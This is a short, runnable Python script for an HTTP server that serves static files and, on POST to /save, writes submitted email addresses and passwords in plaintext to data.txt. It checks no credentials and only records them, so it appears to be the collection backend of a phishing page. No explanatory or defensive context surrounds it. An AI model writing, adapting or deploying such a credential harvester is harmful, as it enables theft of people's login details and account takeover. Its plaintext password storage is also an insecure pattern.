#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler
import urllib.parse
import os

DATA_FILE = 'data.txt'

class Handler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/save':
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length).decode('utf-8')
            params = urllib.parse.parse_qs(body)
            email = params.get('email', [''])[0]
            passwd = params.get('passwd', [''])[0]
            if email and passwd:
                line = f"Email: {email} | Password: {passwd} | Date: {self.date_time_string()}\n"
                with open(DATA_FILE, 'a') as f:
                    f.write(line)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            else:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b'Missing fields')
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        # خدمة الملفات الثابتة
        super().do_GET()

if __name__ == '__main__':
    port = 8080
    server = HTTPServer(('0.0.0.0', port), Handler)
    print(f'Server running on port {port}')
    server.serve_forever()